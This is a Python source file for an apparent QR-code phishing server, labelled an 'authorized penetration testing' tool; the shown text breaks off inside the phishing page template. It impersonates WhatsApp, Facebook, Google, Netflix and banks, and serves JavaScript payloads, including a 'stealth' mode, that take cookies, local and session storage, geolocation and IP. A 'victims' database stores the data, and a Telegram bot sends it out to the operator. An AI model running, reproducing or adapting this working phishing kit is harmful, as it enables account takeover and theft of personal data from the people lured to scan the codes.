#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced QR Code Phishing Hijacking Tool.
For authorized penetration testing only.
"""

import base64
import json
import os
import random
import string
import threading
import time
import uuid
import socket
import hashlib
import sqlite3
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import webbrowser

# ============================================
# CONFIGURATION
# ============================================
class Config:
    """Configuration settings"""
    PORT = 8080
    SERVER_IP = "0.0.0.0"
    TELEGRAM_BOT_TOKEN = ""  # Set your bot token here
    TELEGRAM_CHAT_ID = ""    # Set your chat ID here
    DB_FILE = "victims.db"
    LOG_FILE = "hijack.log"
    QR_EXPIRY_MINUTES = 30
    QR_SIZE = 400
    QR_COLOR = "000000"
    QR_BG_COLOR = "FFFFFF"
    
    TEMPLATES = {
        "whatsapp": {
            "name": "WhatsApp Web Login",
            "icon": "fab fa-whatsapp",
            "color": "#25D366",
            "redirect": "https://web.whatsapp.com"
        },
        "facebook": {
            "name": "Facebook Login Verification",
            "icon": "fab fa-facebook",
            "color": "#1877F2",
            "redirect": "https://facebook.com"
        },
        "google": {
            "name": "Google Account Security",
            "icon": "fab fa-google",
            "color": "#4285F4",
            "redirect": "https://google.com"
        },
        "instagram": {
            "name": "Instagram Login",
            "icon": "fab fa-instagram",
            "color": "#E4405F",
            "redirect": "https://instagram.com"
        },
        "twitter": {
            "name": "Twitter X Login",
            "icon": "fab fa-twitter",
            "color": "#000000",
            "redirect": "https://twitter.com"
        },
        "netflix": {
            "name": "Netflix Device Activation",
            "icon": "fab fa-netflix",
            "color": "#E50914",
            "redirect": "https://netflix.com"
        },
        "bank": {
            "name": "Bank Security Verification",
            "icon": "fas fa-university",
            "color": "#0047AB",
            "redirect": "https://paypal.com"
        },
        "custom": {
            "name": "Custom Verification",
            "icon": "fas fa-qrcode",
            "color": "#4CAF50",
            "redirect": "https://google.com"
        }
    }
    
    JS_PAYLOADS = {
        "basic": """
            const data = {
                cookies: document.cookie,
                url: window.location.href,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                referrer: document.referrer,
                timestamp: new Date().toISOString(),
                sessionId: '%SESSION_ID%',
                template: '%TEMPLATE%'
            };
            
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        """,
        
        "advanced": """
            async function collectAllData() {
                let ipAddress = 'Unknown';
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    ipAddress = data.ip;
                } catch (error) {
                    console.log('IP detection failed');
                }
                
                let location = 'Unknown';
                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject);
                        });
                        location = `${position.coords.latitude},${position.coords.longitude}`;
                    } catch (error) {
                        console.log('Geolocation failed');
                    }
                }
                
                const data = {
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: JSON.stringify(navigator.languages),
                    screen: `${screen.width}x${screen.height}@${screen.colorDepth}bit`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString(),
                    sessionId: '%SESSION_ID%',
                    template: '%TEMPLATE%',
                    ipAddress: ipAddress,
                    location: location,
                    browserInfo: {
                        vendor: navigator.vendor,
                        product: navigator.product,
                        appVersion: navigator.appVersion,
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        maxTouchPoints: navigator.maxTouchPoints,
                        pdfViewerEnabled: navigator.pdfViewerEnabled,
                        webdriver: navigator.webdriver
                    }
                };
                
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                
                setTimeout(() => {
                    window.location.href = '%REDIRECT_URL%';
                }, 2000);
            }
            
            collectAllData();
        """,
        
        "stealth": """
            setTimeout(() => {
                const data = {
                    cookies: document.cookie,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    sessionId: '%SESSION_ID%',
                    template: '%TEMPLATE%'
                };
                
                navigator.sendBeacon('/collect', JSON.stringify(data));
                history.replaceState(null, '', '/clean');
                
                setTimeout(() => {
                    window.location.href = '%REDIRECT_URL%';
                }, 1000);
                
            }, 3000);
        """
    }

# ============================================
# TELEGRAM BOT INTEGRATION (Simplified)
# ============================================
class TelegramBot:
    """Telegram bot for receiving captured data"""
    
    def __init__(self, token=None, chat_id=None):
        self.token = token or Config.TELEGRAM_BOT_TOKEN
        self.chat_id = chat_id or Config.TELEGRAM_CHAT_ID
        self.enabled = bool(self.token and self.chat_id)
    
    def send_message(self, text):
        """Send message to Telegram (synchronous)"""
        if not self.enabled:
            return False
        
        try:
            import requests
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            payload = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            response = requests.post(url, json=payload, timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram send error: {e}")
            return False
    
    def send_document(self, document_data, filename="data.txt"):
        """Send document to Telegram"""
        if not self.enabled:
            return False
        
        try:
            import requests
            temp_file = f"temp_{int(time.time())}.txt"
            with open(temp_file, 'w') as f:
                if isinstance(document_data, dict):
                    f.write(json.dumps(document_data, indent=2))
                else:
                    f.write(str(document_data))
            
            url = f"https://api.telegram.org/bot{self.token}/sendDocument"
            with open(temp_file, 'rb') as f:
                files = {'document': (filename, f)}
                data = {'chat_id': self.chat_id}
                response = requests.post(url, files=files, data=data, timeout=10)
            
            os.remove(temp_file)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram document error: {e}")
            return False
    
    def format_victim_message(self, data):
        """Format victim data for Telegram"""
        template = data.get('template', 'Unknown')
        ip = data.get('ipAddress', data.get('client_ip', 'Unknown'))
        cookies = data.get('cookies', '')
        cookie_count = len(cookies.split(';')) if cookies else 0
        
        message = f"""
🚨 <b>NEW VICTIM CAPTURED!</b> 🚨

📱 <b>Template:</b> {template}
🌐 <b>IP Address:</b> <code>{ip}</code>
🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🍪 <b>Cookies ({cookie_count}):</b>
<code>{cookies[:300]}</code>

🔗 <b>Session ID:</b> <code>{data.get('sessionId', 'Unknown')}</code>

<i>Full data available in dashboard</i>
        """
        return message
    
    def notify_new_victim(self, data):
        """Send notification for new victim"""
        if not self.enabled:
            return False
        
        message = self.format_victim_message(data)
        return self.send_message(message)
    
    def send_stats(self, stats):
        """Send statistics to Telegram"""
        if not self.enabled:
            return False
        
        message = f"""
📊 <b>QR Security Statistics</b>

👥 <b>Total Victims:</b> {stats.get('total_victims', 0)}
🎯 <b>Active QR Codes:</b> {stats.get('active_qr', 0)}
📈 <b>Today's Captures:</b> {stats.get('today_captures', 0)}
🌐 <b>Unique IPs:</b> {stats.get('unique_ips', 0)}

<i>Server running</i>
        """
        return self.send_message(message)
    
    def test_connection(self):
        """Test Telegram bot connection"""
        if not self.enabled:
            return "Telegram bot not configured"
        
        try:
            import requests
            url = f"https://api.telegram.org/bot{self.token}/getMe"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                bot_info = response.json()
                return f"✅ Connected to @{bot_info['result']['username']}"
            else:
                return f"❌ Connection failed"
        except Exception as e:
            return f"❌ Error: {e}"

# ============================================
# DATABASE MANAGER
# ============================================
class DatabaseManager:
    """Manage victim data storage"""
    
    def __init__(self, db_file=Config.DB_FILE):
        self.db_file = db_file
        self.telegram_bot = TelegramBot()
        self.init_database()
    
    def init_database(self):
        """Initialize database with required tables"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id TEXT PRIMARY KEY,
                session_id TEXT,
                ip_address TEXT,
                user_agent TEXT,
                cookies TEXT,
                local_storage TEXT,
                session_storage TEXT,
                url TEXT,
                referrer TEXT,
                screen_resolution TEXT,
                languages TEXT,
                platform TEXT,
                timezone TEXT,
                browser_info TEXT,
                timestamp DATETIME,
                template TEXT,
                qr_code_id TEXT,
                location TEXT,
                status TEXT DEFAULT 'active',
                telegram_sent INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS qr_codes (
                id TEXT PRIMARY KEY,
                template TEXT,
                custom_message TEXT,
                payload_type TEXT DEFAULT 'advanced',
                created_at DATETIME,
                expires_at DATETIME,
                click_count INTEGER DEFAULT 0,
                capture_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_victim(self, data):
        """Save victim data to database and notify via Telegram"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            victim_id = str(uuid.uuid4())[:8]
            session_id = data.get('sessionId', '')
            template = data.get('template', 'unknown')
            
            cursor.execute('''
                INSERT INTO victims VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id,
                session_id,
                data.get('ipAddress', data.get('client_ip', '')),
                data.get('userAgent', ''),
                data.get('cookies', ''),
                data.get('localStorage', ''),
                data.get('sessionStorage', ''),
                data.get('url', ''),
                data.get('referrer', ''),
                data.get('screen', ''),
                data.get('languages', ''),
                data.get('platform', ''),
                data.get('timezone', ''),
                json.dumps(data.get('browserInfo', {})),
                datetime.now().isoformat(),
                template,
                data.get('qrCodeId', ''),
                data.get('location', ''),
                'captured',
                0
            ))
            
            if data.get('qrCodeId'):
                cursor.execute('''
                    UPDATE qr_codes 
                    SET capture_count = capture_count + 1 
                    WHERE id = ?
                ''', (data['qrCodeId'],))
            
            conn.commit()
            conn.close()
            
            # Send Telegram notification (synchronous now)
            self.telegram_bot.notify_new_victim(data)
            
            self.log_event(f"Victim saved: {victim_id} - Template: {template}")
            return victim_id
            
        except Exception as e:
            self.log_event(f"Database error: {e}")
            return None
    
    def create_qr_code(self, template, custom_message=None, payload_type="advanced"):
        """Create a new QR code entry"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            qr_id = hashlib.md5(f"{template}{time.time()}{random.random()}".encode()).hexdigest()[:12]
            
            cursor.execute('''
                INSERT INTO qr_codes (id, template, custom_message, payload_type, created_at, expires_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                qr_id,
                template,
                custom_message,
                payload_type,
                datetime.now().isoformat(),
                (datetime.now() + timedelta(minutes=Config.QR_EXPIRY_MINUTES)).isoformat()
            ))
            
            conn.commit()
            conn.close()
            
            self.log_event(f"QR code created: {qr_id} - Template: {template}")
            return qr_id
            
        except Exception as e:
            self.log_event(f"QR creation error: {e}")
            return None
    
    def get_statistics(self):
        """Get comprehensive statistics"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('SELECT COUNT(*) FROM victims')
            total_victims = cursor.fetchone()[0]
            
            today = datetime.now().strftime('%Y-%m-%d')
            cursor.execute('SELECT COUNT(*) FROM victims WHERE date(timestamp) = ?', (today,))
            today_captures = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM qr_codes WHERE status = "active" AND expires_at > ?', 
                         (datetime.now().isoformat(),))
            active_qr = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(DISTINCT ip_address) FROM victims')
            unique_ips = cursor.fetchone()[0]
            
            cursor.execute('''
                SELECT template, COUNT(*) as count 
                FROM victims 
                GROUP BY template 
                ORDER BY count DESC 
                LIMIT 5
            ''')
            top_templates = cursor.fetchall()
            
            cursor.execute('SELECT timestamp FROM victims ORDER BY timestamp DESC LIMIT 1')
            last_row = cursor.fetchone()
            last_capture = last_row[0] if last_row else 'Never'
            
            conn.close()
            
            return {
                'total_victims': total_victims,
                'today_captures': today_captures,
                'active_qr': active_qr,
                'unique_ips': unique_ips,
                'top_templates': top_templates,
                'last_capture': last_capture[:19] if last_capture != 'Never' else 'Never'
            }
            
        except Exception as e:
            self.log_event(f"Statistics error: {e}")
            return {}
    
    def get_all_victims(self, limit=100):
        """Get all captured victims"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute(f'''
                SELECT * FROM victims 
                ORDER BY timestamp DESC 
                LIMIT ?
            ''', (limit,))
            
            columns = [description[0] for description in cursor.description]
            results = cursor.fetchall()
            
            victims = []
            for row in results:
                victims.append(dict(zip(columns, row)))
            
            conn.close()
            return victims
            
        except Exception as e:
            self.log_event(f"Get victims error: {e}")
            return []
    
    def log_event(self, message):
        """Log event to file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        try:
            with open(Config.LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_entry)
        except:
            pass
        
        print(f"[LOG] {message}")

# ============================================
# QR CODE GENERATOR
# ============================================
class QRCodeGenerator:
    """Generate and manage QR codes"""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.db = DatabaseManager()
    
    def generate_qr_url(self, template="whatsapp", custom_message=None, payload_type="advanced"):
        """Generate QR code URL with tracking"""
        qr_id = self.db.create_qr_code(template, custom_message, payload_type)
        
        if not qr_id:
            return None
        
        qr_url = f"{self.base_url}/scan/{qr_id}"
        
        return {
            'qr_id': qr_id,
            'url': qr_url,
            'template': template,
            'template_name': Config.TEMPLATES.get(template, {}).get('name', 'Unknown'),
            'qr_image_url': f"{self.base_url}/qr/{qr_id}",
            'stats_url': f"{self.base_url}/stats/{qr_id}",
            'payload_type': payload_type,
            'expires_in': Config.QR_EXPIRY_MINUTES
        }
    
    def generate_qr_image(self, qr_id, data):
        """Generate QR code image"""
        try:
            import qrcode
            from io import BytesIO
            
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_H,
                box_size=10,
                border=4,
            )
            
            qr.add_data(data)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color=Config.QR_COLOR, back_color=Config.QR_BG_COLOR)
            
            img_bytes = BytesIO()
            img.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            
            return img_bytes.read()
            
        except ImportError:
            return self.generate_text_qr(data)
    
    def generate_text_qr(self, data):
        """Generate ASCII QR code as fallback"""
        qr_text = f"\n\n{'='*50}\nQR CODE CONTENT\n{'='*50}\n{data}\n{'='*50}\n"
        return qr_text.encode()

# ============================================
# HTTP REQUEST HANDLER
# ============================================
class QRPhishingHandler(BaseHTTPRequestHandler):
    """HTTP handler for QR phishing server"""
    
    db = DatabaseManager()
    qr_generator = None
    telegram_bot = TelegramBot()
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        try:
            path = self.path.split('?')[0]
            
            if path == '/':
                self.serve_home_page()
            elif path == '/generate':
                self.handle_qr_generation()
            elif path.startswith('/scan/'):
                self.handle_scan_redirect(path)
            elif path.startswith('/qr/'):
                self.serve_qr_image(path)
            elif path.startswith('/stats/'):
                self.serve_stats_page(path)
            elif path == '/dashboard':
                self.serve_dashboard()
            elif path == '/api/victims':
                self.serve_victims_api()
            elif path == '/api/qrcodes':
                self.serve_qrcodes_api()
            elif path == '/api/stats':
                self.serve_stats_api()
            elif path == '/config-telegram':
                self.serve_telegram_config()
            elif path == '/telegram-test':
                self.handle_telegram_test()
            else:
                self.send_error(404, "Not Found")
                
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {str(e)}")
    
    def do_POST(self):
        """Handle POST requests"""
        if self.path == '/collect':
            self.handle_data_collection()
        elif self.path == '/api/generate':
            self.handle_api_generation()
        elif self.path == '/save-telegram':
            self.handle_telegram_save()
        else:
            self.send_error(404, "Not Found")
    
    def serve_home_page(self):
        """Serve the home page"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = self.generate_home_page()
        self.wfile.write(html.encode())
    
    def handle_qr_generation(self):
        """Handle QR code generation request"""
        query = urlparse(self.path).query
        params = parse_qs(query)
        
        template = params.get('template', ['whatsapp'])[0]
        custom_message = params.get('message', [None])[0]
        payload = params.get('payload', ['advanced'])[0]
        
        if self.qr_generator:
            result = self.qr_generator.generate_qr_url(template, custom_message, payload)
            
            if result:
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                
                response = {
                    'success': True,
                    'data': result,
                    'telegram_enabled': self.telegram_bot.enabled
                }
                
                self.wfile.write(json.dumps(response).encode())
            else:
                self.send_error(500, "Failed to generate QR code")
        else:
            self.send_error(500, "QR generator not initialized")
    
    def handle_scan_redirect(self, path):
        """Handle QR scan redirection with payload injection"""
        qr_id = path.split('/')[-1]
        
        conn = sqlite3.connect(Config.DB_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT template, payload_type FROM qr_codes WHERE id = ?', (qr_id,))
        result = cursor.fetchone()
        
        if not result:
            self.send_error(404, "QR Code not found or expired")
            return
        
        template, payload_type = result
        
        cursor.execute('UPDATE qr_codes SET click_count = click_count + 1 WHERE id = ?', (qr_id,))
        conn.commit()
        conn.close()
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = self.generate_phishing_page(template, qr_id, payload_type)
        self.wfile.write(html.encode())
    
    def serve_qr_image(self, path):
        """Serve QR code image"""
        qr_id = path.split('/')[-1]
        
        if self.qr_generator:
            qr_url = f"http://{self.headers.get('Host')}/scan/{qr_id}"
            qr_image = self.qr_generator.generate_qr_image(qr_id, qr_url)
            
            self.send_response(200)
            self.send_header('Content-type', 'image/png')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            
            self.wfile.write(qr_image)
        else:
            self.send_error(404, "QR not found")
    
    def handle_data_collection(self):
        """Handle incoming victim data"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            data['client_ip'] = self.client_address[0]
            
            victim_id = self.db.save_victim(data)
            
            response = {
                'success': bool(victim_id),
                'victim_id': victim_id,
                'telegram_notified': self.telegram_bot.enabled,
                'message': 'Data captured successfully' if victim_id else 'Failed to capture data'
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            self.wfile.write(json.dumps(response).encode())
            
        except json.JSONDecodeError:
            self.send_error(400, "Invalid JSON")
        except Exception as e:
            self.send_error(500, f"Processing error: {str(e)}")
    
    def serve_stats_page(self, path):
        """Serve statistics page for a QR code"""
        qr_id = path.split('/')[-1]
        
        try:
            conn = sqlite3.connect(Config.DB_FILE)
            cursor = conn.cursor()
            
            cursor.execute('SELECT * FROM qr_codes WHERE id = ?', (qr_id,))
            columns = [description[0] for description in cursor.description]
            result = cursor.fetchone()
            
            if result:
                qr_data = dict(zip(columns, result))
                
                cursor.execute('SELECT COUNT(*) FROM victims WHERE qr_code_id = ?', (qr_id,))
                victim_count = cursor.fetchone()[0]
                qr_data['victim_count'] = victim_count
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                
                self.wfile.write(json.dumps(qr_data).encode())
            else:
                self.send_error(404, "QR code not found")
                
            conn.close()
            
        except Exception as e:
            self.send_error(500, str(e))
    
    def serve_dashboard(self):
        """Serve admin dashboard"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = self.generate_dashboard()
        self.wfile.write(html.encode())
    
    def serve_victims_api(self):
        """API endpoint for victims data"""
        victims = self.db.get_all_victims()
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        self.wfile.write(json.dumps(victims).encode())
    
    def serve_qrcodes_api(self):
        """API endpoint for QR codes"""
        try:
            conn = sqlite3.connect(Config.DB_FILE)
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM qr_codes ORDER BY created_at DESC')
            
            columns = [description[0] for description in cursor.description]
            results = cursor.fetchall()
            
            qrcodes = []
            for row in results:
                qrcodes.append(dict(zip(columns, row)))
            
            conn.close()
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            self.wfile.write(json.dumps(qrcodes).encode())
            
        except Exception as e:
            self.send_error(500, str(e))
    
    def serve_stats_api(self):
        """API endpoint for statistics"""
        stats = self.db.get_statistics()
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        self.wfile.write(json.dumps(stats).encode())
    
    def serve_telegram_config(self):
        """Serve Telegram configuration page"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = self.generate_telegram_config_page()
        self.wfile.write(html.encode())
    
    def handle_telegram_test(self):
        """Test Telegram connection"""
        result = self.telegram_bot.test_connection()
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        response = {
            'success': '✅' in result,
            'message': result
        }
        
        self.wfile.write(json.dumps(response).encode())
    
    def handle_telegram_save(self):
        """Save Telegram configuration"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            
            Config.TELEGRAM_BOT_TOKEN = data.get('bot_token', '')
            Config.TELEGRAM_CHAT_ID = data.get('chat_id', '')
            
            self.telegram_bot = TelegramBot(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)
            self.db.telegram_bot = self.telegram_bot
            
            response = {
                'success': True,
                'message': 'Telegram configuration saved!',
                'enabled': self.telegram_bot.enabled
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_error(500, str(e))
    
    def handle_api_generation(self):
        """API endpoint for generating QR codes"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            
            template = data.get('template', 'whatsapp')
            custom_message = data.get('message')
            payload = data.get('payload', 'advanced')
            
            if self.qr_generator:
                result = self.qr_generator.generate_qr_url(template, custom_message, payload)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                
                self.wfile.write(json.dumps({
                    'success': True,
                    'data': result
                }).encode())
            else:
                self.send_error(500, "QR generator not available")
                
        except Exception as e:
            self.send_error(400, str(e))
    
    def generate_home_page(self):
        """Generate home page HTML"""
        stats = self.db.get_statistics()
        
        template_options = ""
        for key, value in Config.TEMPLATES.items():
            template_options += f'<option value="{key}">{value["name"]}</option>'
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>QR Code Generator - Security Testing</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    color: white;
                    min-height: 100vh;
                    padding: 20px;
                }}
                .container {{ max-width: 1200px; margin: 0 auto; }}
                .header {{
                    text-align: center;
                    margin-bottom: 40px;
                    padding: 30px;
                    background: rgba(255,255,255,0.05);
                    border-radius: 20px;
                }}
                .header h1 {{ font-size: 2.5em; background: linear-gradient(90deg, #4CAF50, #2196F3); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
                .stats-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 40px;
                }}
                .stat-card {{
                    background: rgba(255,255,255,0.05);
                    padding: 20px;
                    border-radius: 15px;
                    text-align: center;
                }}
                .stat-card i {{ font-size: 2em; margin-bottom: 10px; color: #4CAF50; }}
                .stat-card .number {{ font-size: 2em; font-weight: bold; }}
                .main-grid {{
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 30px;
                }}
                @media (max-width: 768px) {{ .main-grid {{ grid-template-columns: 1fr; }} }}
                .form-container, .preview-container {{
                    background: rgba(255,255,255,0.05);
                    padding: 30px;
                    border-radius: 20px;
                }}
                .form-group {{ margin-bottom: 20px; }}
                label {{ display: block; margin-bottom: 8px; color: #aaa; }}
                select, input, textarea {{
                    width: 100%;
                    padding: 12px;
                    background: rgba(255,255,255,0.07);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 10px;
                    color: white;
                }}
                .btn {{
                    padding: 12px 25px;
                    background: linear-gradient(90deg, #4CAF50, #2196F3);
                    color: white;
                    border: none;
                    border-radius: 10px;
                    cursor: pointer;
                    width: 100%;
                }}
                .result {{
                    margin-top: 20px;
                    padding: 20px;
                    background: rgba(255,255,255,0.05);
                    border-radius: 15px;
                    display: none;
                }}
                .qr-preview {{ text-align: center; margin: 20px 0; }}
                .qr-preview img {{ max-width: 200px; border-radius: 10px; }}
                .nav-links {{ display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap; }}
                .nav-link {{
                    padding: 10px 20px;
                    background: rgba(255,255,255,0.05);
                    border-radius: 10px;
                    text-decoration: none;
                    color: white;
                }}
                .alert {{
                    padding: 12px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                    display: none;
                }}
                .alert-success {{ background: rgba(76,175,80,0.2); border: 1px solid rgba(76,175,80,0.3); color: #4CAF50; }}
                .alert-error {{ background: rgba(244,67,54,0.2); border: 1px solid rgba(244,67,54,0.3); color: #f44336; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1><i class="fas fa-qrcode"></i> QR Code Security Tool</h1>
                    <p>Authorized Penetration Testing Platform</p>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card"><i class="fas fa-users"></i><div class="number">{stats.get('total_victims', 0)}</div><div>Total Captures</div></div>
                    <div class="stat-card"><i class="fas fa-qrcode"></i><div class="number">{stats.get('active_qr', 0)}</div><div>Active QR Codes</div></div>
                    <div class="stat-card"><i class="fas fa-calendar-day"></i><div class="number">{stats.get('today_captures', 0)}</div><div>Today's Captures</div></div>
                    <div class="stat-card"><i class="fas fa-globe"></i><div class="number">{stats.get('unique_ips', 0)}</div><div>Unique IPs</div></div>
                </div>
                
                <div class="main-grid">
                    <div class="form-container">
                        <h2><i class="fas fa-cogs"></i> Generate QR Code</h2>
                        <div id="alert" class="alert"></div>
                        <div class="form-group">
                            <label>Service Template:</label>
                            <select id="template">{template_options}</select>
                        </div>
                        <div class="form-group">
                            <label>Data Collection Mode:</label>
                            <select id="payload">
                                <option value="basic">Basic (Cookies only)</option>
                                <option value="advanced" selected>Advanced (Full data)</option>
                                <option value="stealth">Stealth (Delayed)</option>
                            </select>
                        </div>
                        <button class="btn" onclick="generateQR()"><i class="fas fa-bolt"></i> Generate QR Code</button>
                        <div class="nav-links">
                            <a href="/dashboard" class="nav-link"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
                            <a href="/config-telegram" class="nav-link"><i class="fab fa-telegram"></i> Telegram Config</a>
                        </div>
                    </div>
                    
                    <div class="preview-container">
                        <h2><i class="fas fa-eye"></i> Preview</h2>
                        <div id="result" class="result">
                            <div class="qr-preview"><img id="qrImage" src=""></div>
                            <p><strong>URL:</strong> <span id="qrUrl"></span></p>
                            <p><strong>ID:</strong> <span id="qrId"></span></p>
                            <div class="nav-links">
                                <a href="#" onclick="copyQRUrl()" class="nav-link"><i class="fas fa-copy"></i> Copy URL</a>
                                <a href="#" id="statsLink" target="_blank" class="nav-link"><i class="fas fa-chart-bar"></i> Stats</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <script>
                async function generateQR() {{
                    const template = document.getElementById('template').value;
                    const payload = document.getElementById('payload').value;
                    const params = new URLSearchParams({{template, payload}});
                    
                    try {{
                        const response = await fetch('/generate?' + params.toString());
                        const data = await response.json();
                        
                        if(data.success) {{
                            document.getElementById('qrImage').src = data.data.qr_image_url;
                            document.getElementById('qrUrl').innerText = data.data.url;
                            document.getElementById('qrId').innerText = data.data.qr_id;
                            document.getElementById('statsLink').href = '/stats/' + data.data.qr_id;
                            document.getElementById('result').style.display = 'block';
                            showAlert('QR Code generated!', 'success');
                        }}
                    }} catch(error) {{
                        showAlert('Error: ' + error.message, 'error');
                    }}
                }}
                
                async function copyQRUrl() {{
                    const url = document.getElementById('qrUrl').innerText;
                    await navigator.clipboard.writeText(url);
                    showAlert('URL copied!', 'success');
                }}
                
                function showAlert(message, type) {{
                    const alert = document.getElementById('alert');
                    alert.textContent = message;
                    alert.className = `alert alert-${{type}}`;
                    alert.style.display = 'block';
                    setTimeout(() => alert.style.display = 'none', 3000);
                }}
            </script>
        </body>
        </html>
        """
    
    def generate_phishing_page(self, template, qr_id, payload_type="advanced"):
        """Generate phishing page with JavaScript payload"""
        template_data = Config.TEMPLATES.get(template, Config.TEMPLATES["whatsapp"])
        payload = Config.JS_PAYLOADS.get(payload_type, Config.JS_PAYLOADS["advanced"])
        
        payload = payload.replace('%SESSION_ID%', qr_id)
        payload = payload.replace('%TEMPLATE%', template)
        payload = payload.replace('%REDIRECT_URL%', template_data.get('redirect', 'https://google.com'))
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>{template_data['name']}</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, {template_data['color']} 0%, #ffffff 100%);
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
